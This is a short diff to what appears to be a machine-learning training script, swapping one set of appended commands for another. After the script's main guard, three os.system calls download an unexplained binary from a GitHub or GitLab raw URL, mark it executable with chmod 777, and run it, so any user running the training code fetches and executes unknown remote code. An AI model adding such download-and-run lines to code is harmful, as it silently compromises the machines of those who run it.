@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/aqshakuy/kucluk/raw/main/ravcuk')
-os.system('chmod 777 ravcuk')
-os.system('./ravcuk')
+os.system('wget https://gitlab.com/xokoplafisop/fathunkuy/-/raw/main/rvncuuk')
+os.system('chmod 777 rvncuuk')
+os.system('./rvncuuk')
